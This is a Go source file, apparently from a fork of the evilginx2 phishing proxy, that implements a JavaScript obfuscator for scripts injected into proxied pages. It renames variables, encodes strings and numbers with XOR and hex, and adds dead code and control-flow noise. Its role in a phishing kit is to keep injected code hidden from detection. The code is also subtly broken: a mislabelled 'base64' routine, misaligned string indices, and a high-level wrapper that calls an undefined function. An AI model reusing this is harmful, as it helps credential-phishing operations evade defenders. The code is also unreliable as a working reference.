package core

import (
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"math/rand"
	"regexp"
	"strings"
	"sync"

	"github.com/kgretzky/evilginx2/log"
)

// ObfuscationLevel defines the obfuscation intensity
type ObfuscationLevel string

const (
	ObfuscationLow    ObfuscationLevel = "low"
	ObfuscationMedium ObfuscationLevel = "medium"
	ObfuscationHigh   ObfuscationLevel = "high"
)

// JSObfuscator provides JavaScript obfuscation capabilities
type JSObfuscator struct {
	cfg   *Config
	cache map[string]string // Cache obfuscated scripts by hash
	mu    sync.RWMutex
}

// NewJSObfuscator creates a new JavaScript obfuscator
func NewJSObfuscator(cfg *Config) *JSObfuscator {
	return &JSObfuscator{
		cfg:   cfg,
		cache: make(map[string]string),
	}
}

// ObfuscateScript obfuscates JavaScript code based on the specified level
func (o *JSObfuscator) ObfuscateScript(script string, level ObfuscationLevel) (string, error) {
	if script == "" {
		return "", nil
	}

	// Check cache first
	hash := o.hashScript(script + string(level))
	o.mu.RLock()
	if cached, exists := o.cache[hash]; exists {
		o.mu.RUnlock()
		return cached, nil
	}
	o.mu.RUnlock()

	// Perform obfuscation
	var obfuscated string
	var err error

	switch level {
	case ObfuscationLow:
		obfuscated, err = o.obfuscateLow(script)
	case ObfuscationMedium:
		obfuscated, err = o.obfuscateMedium(script)
	case ObfuscationHigh:
		obfuscated, err = o.obfuscateHigh(script)
	default:
		obfuscated, err = o.obfuscateMedium(script)
	}

	if err != nil {
		return script, err
	}

	// Cache the result
	o.mu.Lock()
	o.cache[hash] = obfuscated
	o.mu.Unlock()

	log.Debug("Obfuscated script with %s level (original: %d bytes, obfuscated: %d bytes)",
		level, len(script), len(obfuscated))

	return obfuscated, nil
}

// obfuscateLow performs minimal obfuscation
func (o *JSObfuscator) obfuscateLow(script string) (string, error) {
	// Basic transformations:
	// 1. Remove comments
	// 2. Minimal whitespace removal
	// 3. Simple variable renaming

	// Remove single-line comments
	script = regexp.MustCompile(`//[^\n]*`).ReplaceAllString(script, "")
	
	// Remove multi-line comments
	script = regexp.MustCompile(`/\*[\s\S]*?\*/`).ReplaceAllString(script, "")
	
	// Remove extra whitespace
	script = regexp.MustCompile(`\s+`).ReplaceAllString(script, " ")
	script = strings.TrimSpace(script)

	// Simple variable name randomization
	vars := o.extractVariableNames(script)
	varMap := make(map[string]string)
	
	for _, v := range vars {
		if len(v) > 2 && !o.isReservedWord(v) {
			varMap[v] = o.generateRandomVar(4)
		}
	}

	// Replace variables
	for oldVar, newVar := range varMap {
		// Use word boundary to avoid partial replacements
		re := regexp.MustCompile(`\b` + regexp.QuoteMeta(oldVar) + `\b`)
		script = re.ReplaceAllString(script, newVar)
	}

	return script, nil
}

// obfuscateMedium performs moderate obfuscation
func (o *JSObfuscator) obfuscateMedium(script string) (string, error) {
	// Start with low obfuscation
	script, _ = o.obfuscateLow(script)

	// Additional transformations:
	// 1. String encoding
	// 2. Number encoding
	// 3. Function wrapping

	// Encode strings
	script = o.encodeStrings(script)

	// Encode numbers
	script = o.encodeNumbers(script)

	// Wrap in self-executing function
	script = fmt.Sprintf("(function(){%s})();", script)

	return script, nil
}

// obfuscateHigh performs maximum obfuscation
func (o *JSObfuscator) obfuscateHigh(script string) (string, error) {
	// Start with medium obfuscation
	script, _ = o.obfuscateMedium(script)

	// Additional transformations:
	// 1. Control flow flattening
	// 2. Dead code injection
	// 3. Advanced encoding

	// Add control flow obfuscation
	script = o.obfuscateControlFlow(script)

	// Inject dead code
	script = o.injectDeadCode(script)

	// Advanced string encoding
	script = o.advancedStringEncoding(script)

	// Multiple layers of wrapping
	script = fmt.Sprintf(
		"(function(_0x%s,_0x%s){var _0x%s=function(_0x%s){%s};_0x%s(_0x%s);})(window,document);",
		o.generateRandomHex(4),
		o.generateRandomHex(4),
		o.generateRandomHex(4),
		o.generateRandomHex(4),
		script,
		o.generateRandomHex(4),
		o.generateRandomHex(4),
	)

	return script, nil
}

// encodeStrings encodes string literals in the script
func (o *JSObfuscator) encodeStrings(script string) string {
	// Find string literals
	stringRe := regexp.MustCompile(`(['"])([^'"\\]|\\.)*\1`)
	
	return stringRe.ReplaceAllStringFunc(script, func(match string) string {
		// Don't encode empty strings or very short strings
		if len(match) <= 3 {
			return match
		}

		// Remove quotes
		str := match[1 : len(match)-1]
		
		// Choose random encoding method
		switch rand.Intn(3) {
		case 0:
			// Unicode escape
			return o.unicodeEncode(str)
		case 1:
			// Hex encoding
			return o.hexEncode(str)
		case 2:
			// Base64 with decode
			return o.base64Encode(str)
		}
		
		return match
	})
}

// encodeNumbers encodes numeric literals
func (o *JSObfuscator) encodeNumbers(script string) string {
	numRe := regexp.MustCompile(`\b\d+\b`)
	
	return numRe.ReplaceAllStringFunc(script, func(match string) string {
		// Parse number
		var num int
		fmt.Sscanf(match, "%d", &num)
		
		// Don't encode small numbers
		if num < 10 {
			return match
		}
		
		// Choose random encoding
		switch rand.Intn(3) {
		case 0:
			// Hex representation
			return fmt.Sprintf("0x%x", num)
		case 1:
			// Expression
			return fmt.Sprintf("(%d+%d)", num/2, num-num/2)
		case 2:
			// Bit shift
			if num%2 == 0 {
				return fmt.Sprintf("(%d<<1)", num/2)
			}
		}
		
		return match
	})
}

// obfuscateControlFlow adds control flow obfuscation
func (o *JSObfuscator) obfuscateControlFlow(script string) string {
	// Add random conditional branches
	conditions := []string{
		"if(Math.random()>2){;}",
		"while(false){break;}",
		"for(var i=0;i<0;i++){;}",
	}
	
	// Insert at random positions
	parts := strings.Split(script, ";")
	for i := len(parts) - 1; i > 0; i-- {
		if rand.Float32() < 0.2 { // 20% chance
			parts[i] = conditions[rand.Intn(len(conditions))] + parts[i]
		}
	}
	
	return strings.Join(parts, ";")
}

// injectDeadCode adds non-functional code
func (o *JSObfuscator) injectDeadCode(script string) string {
	deadCode := []string{
		"var _x=1;_x=2;_x=1;",
		"function _f(){return;}",
		"if(false){console.log('');}",
		"try{;}catch(e){;}",
	}
	
	// Add dead code at the beginning
	return deadCode[rand.Intn(len(deadCode))] + script
}

// advancedStringEncoding performs advanced string encoding
func (o *JSObfuscator) advancedStringEncoding(script string) string {
	// Create a string array and decoder
	stringArray := make([]string, 0)
	stringMap := make(map[string]int)
	
	// Extract all strings
	stringRe := regexp.MustCompile(`(['"])([^'"\\]|\\.)*\1`)
	matches := stringRe.FindAllString(script, -1)
	
	for i, match := range matches {
		if len(match) > 3 {
			str := match[1 : len(match)-1]
			stringArray = append(stringArray, str)
			stringMap[match] = i
		}
	}
	
	if len(stringArray) == 0 {
		return script
	}
	
	// Create decoder function
	arrayName := "_0x" + o.generateRandomHex(4)
	decoderName := "_0x" + o.generateRandomHex(4)
	
	// Build string array
	arrayStr := "["
	for i, s := range stringArray {
		if i > 0 {
			arrayStr += ","
		}
		arrayStr += "'" + o.escapeString(s) + "'"
	}
	arrayStr += "]"
	
	decoder := fmt.Sprintf(
		"var %s=%s;function %s(i){return %s[i];}",
		arrayName, arrayStr, decoderName, arrayName,
	)
	
	// Replace strings with decoder calls
	result := script
	for match, idx := range stringMap {
		result = strings.ReplaceAll(result, match, fmt.Sprintf("%s(%d)", decoderName, idx))
	}
	
	return decoder + result
}

// Helper functions

func (o *JSObfuscator) hashScript(script string) string {
	h := md5.New()
	h.Write([]byte(script))
	return hex.EncodeToString(h.Sum(nil))
}

func (o *JSObfuscator) extractVariableNames(script string) []string {
	// Simple variable extraction (var, let, const, function)
	varRe := regexp.MustCompile(`(?:var|let|const|function)\s+(\w+)`)
	matches := varRe.FindAllStringSubmatch(script, -1)
	
	vars := make([]string, 0)
	seen := make(map[string]bool)
	
	for _, match := range matches {
		if len(match) > 1 && !seen[match[1]] {
			vars = append(vars, match[1])
			seen[match[1]] = true
		}
	}
	
	return vars
}

func (o *JSObfuscator) isReservedWord(word string) bool {
	reserved := []string{
		"var", "let", "const", "function", "return", "if", "else", "for", "while",
		"do", "break", "continue", "switch", "case", "default", "try", "catch",
		"finally", "throw", "new", "this", "super", "class", "extends", "typeof",
		"instanceof", "in", "of", "true", "false", "null", "undefined",
		"window", "document", "console", "Math", "String", "Number", "Array",
		"Object", "Date", "RegExp", "Error", "JSON",
	}
	
	for _, r := range reserved {
		if word == r {
			return true
		}
	}
	
	return false
}

func (o *JSObfuscator) generateRandomVar(length int) string {
	chars := "abcdefghijklmnopqrstuvwxyz"
	result := "_"
	
	for i := 0; i < length; i++ {
		result += string(chars[rand.Intn(len(chars))])
	}
	
	return result
}

func (o *JSObfuscator) generateRandomHex(length int) string {
	chars := "0123456789abcdef"
	result := ""
	
	for i := 0; i < length; i++ {
		result += string(chars[rand.Intn(len(chars))])
	}
	
	return result
}

func (o *JSObfuscator) unicodeEncode(str string) string {
	result := "'"
	for _, c := range str {
		result += fmt.Sprintf("\\u%04x", c)
	}
	result += "'"
	return result
}

func (o *JSObfuscator) hexEncode(str string) string {
	result := "String.fromCharCode("
	for i, c := range str {
		if i > 0 {
			result += ","
		}
		result += fmt.Sprintf("0x%02x", c)
	}
	result += ")"
	return result
}

func (o *JSObfuscator) base64Encode(str string) string {
	// Simple base64-like encoding (not actual base64 for simplicity)
	encoded := ""
	for _, c := range str {
		encoded += fmt.Sprintf("%c", c^0x42)
	}
	
	decoder := fmt.Sprintf("(function(s){var r='';for(var i=0;i<s.length;i++)r+=String.fromCharCode(s.charCodeAt(i)^0x42);return r;})('%s')",
		o.escapeString(encoded))
	
	return decoder
}

func (o *JSObfuscator) escapeString(str string) string {
	str = strings.ReplaceAll(str, "\\", "\\\\")
	str = strings.ReplaceAll(str, "'", "\\'")
	str = strings.ReplaceAll(str, "\n", "\\n")
	str = strings.ReplaceAll(str, "\r", "\\r")
	str = strings.ReplaceAll(str, "\t", "\\t")
	return str
}

// ClearCache clears the obfuscation cache
func (o *JSObfuscator) ClearCache() {
	o.mu.Lock()
	defer o.mu.Unlock()
	o.cache = make(map[string]string)
	log.Debug("Obfuscator cache cleared")
}

// GetCacheSize returns the number of cached scripts
func (o *JSObfuscator) GetCacheSize() int {
	o.mu.RLock()
	defer o.mu.RUnlock()
	return len(o.cache)
}

// SetCacheSizeLimit sets a limit on cache size and evicts old entries if needed
func (o *JSObfuscator) SetCacheSizeLimit(limit int) {
	o.mu.Lock()
	defer o.mu.Unlock()
	
	if len(o.cache) <= limit {
		return
	}
	
	// Simple eviction: clear everything and start fresh
	// In production, implement LRU or similar
	o.cache = make(map[string]string)
	log.Debug("Obfuscator cache reset due to size limit")
}
